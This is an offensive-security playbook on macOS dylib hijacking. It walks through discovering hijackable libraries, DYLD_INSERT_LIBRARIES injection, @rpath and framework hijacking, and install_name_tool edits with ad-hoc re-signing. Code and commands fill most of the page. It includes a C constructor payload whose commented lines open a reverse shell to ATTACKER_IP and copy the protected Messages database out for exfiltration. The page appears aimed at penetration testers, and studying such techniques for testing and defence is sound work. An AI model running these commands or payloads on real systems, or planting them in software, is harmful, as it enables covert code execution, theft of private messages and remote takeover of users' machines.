# dylib Hijacking on macOS

Exploit weak dynamic library loading to execute code in the context of a target application.

**MITRE ATT&CK**: T1574.004 — Dylib Hijacking

---

## How It Works

macOS applications load dynamic libraries (`.dylib`) using paths that may include search variables:

| Variable | Resolves To |
|----------|-------------|
| `@executable_path` | Directory containing the main executable |
| `@loader_path` | Directory containing the Mach-O that references the dylib |
| `@rpath` | Run-path search paths set in the binary (can be multiple) |

If a dylib isn't found at its expected path, the loader searches fallback locations — an attacker can place a malicious dylib there first.

---

## 1. Discover Hijackable dylibs

### Check LC_LOAD_DYLIB entries
```bash
# List all dylibs an app loads
otool -L /Applications/TargetApp.app/Contents/MacOS/TargetApp

# Show @rpath search paths
otool -l /Applications/TargetApp.app/Contents/MacOS/TargetApp | grep -A2 LC_RPATH

# Find weak dylib loads (optional libraries — won't crash if missing)
otool -l /Applications/TargetApp.app/Contents/MacOS/TargetApp | grep -A4 LC_LOAD_WEAK_DYLIB
```

### Automated Scanner
```bash
# Find all @rpath dylibs and check if any path in the rpath list is writable
APP="/Applications/TargetApp.app/Contents/MacOS/TargetApp"

echo "[*] @rpath entries:"
otool -l "$APP" | grep -A2 LC_RPATH | grep path | awk '{print $2}'

echo "[*] @rpath dylibs:"
otool -L "$APP" | grep "@rpath" | awk '{print $1}'

echo "[*] Weak dylibs (missing = no crash):"
otool -l "$APP" | grep -B1 -A4 "LC_LOAD_WEAK_DYLIB" | grep name | awk '{print $2}'

# Check writable paths
for rpath in $(otool -l "$APP" | grep -A2 LC_RPATH | grep path | awk '{print $2}'); do
    resolved="${rpath/@executable_path/$(dirname "$APP")}"
    resolved="${resolved/@loader_path/$(dirname "$APP")}"
    if [ -w "$(dirname "$resolved")" ]; then
        echo "[!] WRITABLE: $resolved"
    fi
done
```

### DYLD_PRINT_LIBRARIES (runtime discovery)
```bash
# Run the app and see every dylib loaded in order
DYLD_PRINT_LIBRARIES=1 /Applications/TargetApp.app/Contents/MacOS/TargetApp 2>&1 | head -50

# Show search failures (where hijack is possible)
DYLD_PRINT_SEARCHING=1 /Applications/TargetApp.app/Contents/MacOS/TargetApp 2>&1 | grep "not found"
```

---

## 2. DYLD_INSERT_LIBRARIES Injection

Insert a dylib into any non-hardened, non-SIP-protected process.

```bash
# Check if target is hardened (has the hardened runtime flag)
codesign -dvvv /Applications/TargetApp.app 2>&1 | grep "flags"
# If "runtime" flag is present → DYLD_INSERT_LIBRARIES won't work unless SIP is off

# If not hardened:
DYLD_INSERT_LIBRARIES=/path/to/payload.dylib /Applications/TargetApp.app/Contents/MacOS/TargetApp
```

### Restrictions
| Condition | DYLD_INSERT_LIBRARIES Works? |
|-----------|------------------------------|
| SIP enabled + hardened runtime | No |
| SIP enabled + no hardened runtime | Yes |
| SIP disabled | Yes (even hardened) |
| SUID/SGID binary | No (dyld strips env vars) |
| Notarized app | Usually hardened = No |

### Payload Template
```c
// payload.c — compile with: gcc -dynamiclib -o payload.dylib payload.c
#include <stdio.h>
#include <stdlib.h>

__attribute__((constructor))
void payload_init(void) {
    // Runs when dylib is loaded, before main()
    system("id > /tmp/pwned.txt");

    // Or: reverse shell
    // system("bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1 &");

    // Or: read TCC-protected files (if injected into FDA-entitled app)
    // system("cp ~/Library/Messages/chat.db /tmp/exfil_chat.db");
}
```

---

## 3. @rpath Hijacking

When a binary loads `@rpath/SomeLib.framework/SomeLib`, the loader tries each rpath entry in order. Place your dylib at an earlier rpath.

```bash
# Example: App has these rpaths (in order):
#   1. @executable_path/../Frameworks    ← check this first
#   2. /usr/local/lib
#   3. @loader_path/../Frameworks

# If @executable_path/../Frameworks is writable (e.g., app installed in ~/Applications):
cp payload.dylib ~/Applications/TargetApp.app/Contents/Frameworks/SomeLib.framework/SomeLib

# The app loads our dylib before checking /usr/local/lib
```

---

## 4. Electron App dylib Hijacking

Electron apps are prime targets — they bundle frameworks with predictable paths.

```bash
# Electron apps typically load:
# @rpath/Electron Framework.framework/Electron Framework
# @rpath/Mantle.framework/Mantle
# etc.

# Check the app's Frameworks directory permissions
ls -la /Applications/ElectronApp.app/Contents/Frameworks/

# If writable (user-installed in ~/Applications or via Homebrew Cask):
# Replace or inject into the framework search path
```

---

## 5. Framework Hijacking

Replace an entire framework bundle with a malicious one.

```bash
# Create a minimal framework that proxies to the original
FRAMEWORK_NAME="TargetFramework"
ORIG_PATH="/Applications/App.app/Contents/Frameworks/$FRAMEWORK_NAME.framework/$FRAMEWORK_NAME"

# Backup original
cp "$ORIG_PATH" "${ORIG_PATH}.bak"

# Compile hijack dylib that loads the original after executing payload
gcc -dynamiclib -o "$ORIG_PATH" \
    -install_name "@rpath/$FRAMEWORK_NAME.framework/$FRAMEWORK_NAME" \
    payload.c \
    -Wl,-reexport_library,"${ORIG_PATH}.bak"
```

---

## 6. install_name_tool Manipulation

Modify a binary's LC_LOAD_DYLIB entries to load your dylib.

```bash
# Change where the binary looks for a dylib
install_name_tool -change \
    /usr/lib/libsystem_c.dylib \
    /tmp/evil_libsystem_c.dylib \
    /path/to/target_binary

# Add a new dylib load
install_name_tool -add_rpath /tmp/evil_frameworks /path/to/target_binary

# Re-sign after modification (ad-hoc)
codesign -f -s - /path/to/target_binary
```

---

## What to Document

- Application name, version, and install location
- Whether app directory is writable by non-root users
- Which dylib was hijacked and its load path
- Whether SIP and hardened runtime were enabled
- Whether code signing was enforced (could you re-sign ad-hoc?)
- Impact: what ran in the application's context (TCC grants inherited)
